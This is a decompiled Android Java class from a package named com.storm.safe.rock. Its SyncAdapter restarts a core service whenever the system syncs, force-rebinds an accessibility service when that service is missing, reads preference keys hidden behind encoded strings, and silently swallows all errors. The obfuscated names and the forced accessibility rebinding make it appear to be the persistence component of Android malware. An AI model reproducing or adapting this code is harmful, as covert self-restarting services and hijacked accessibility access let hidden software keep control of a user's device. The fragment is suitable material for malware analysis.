package p000;

import android.accounts.Account;
import android.content.AbstractThreadedSyncAdapter;
import android.content.ContentProviderClient;
import android.content.Context;
import android.content.SyncResult;
import android.os.Bundle;
import com.storm.safe.rock.service.AppCoreService;
import com.storm.safe.rock.service.dqtvuisjd;
import com.storm.safe.rock.service.modules.C0323a8;
import com.storm.safe.rock.service.tisxhskrc;
import com.storm.safe.rock.util.StringUtil;

/* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
/* loaded from: classes2.dex */
public final class qk1 extends AbstractThreadedSyncAdapter {
    @Override // android.content.AbstractThreadedSyncAdapter
    public final void onPerformSync(Account account, Bundle bundle, String str, ContentProviderClient contentProviderClient, SyncResult syncResult) {
        try {
            AppCoreService.C0277a0 c0277a0 = AppCoreService.f52296a0;
            if (!c0277a0.isRunning()) {
                Context context = getContext();
                t60.m214694b5(context, "context");
                c0277a0.start(context);
            }
            if (dqtvuisjd.f52358m1.getInstance() == null) {
                tisxhskrc.C0380a0 c0380a0 = tisxhskrc.f55188a0;
                Context context2 = getContext();
                t60.m214694b5(context2, "context");
                c0380a0.tryForceRebindAccessibility(context2);
                return;
            }
            if (getContext().getSharedPreferences(StringUtil.m212470a0("KkkBBV4sDTpS"), 0).getBoolean(StringUtil.m212470a0("KkwFMkIqBTRWJSJWHwVONwE+WzQ/XBU="), false)) {
                lj0 lj0Var = C0323a8.f53097e0;
                Context context3 = getContext();
                t60.m214694b5(context3, "context");
                lj0Var.getOrCreate(context3).m211643a8();
            }
        } catch (Exception unused) {
        }
    }
}
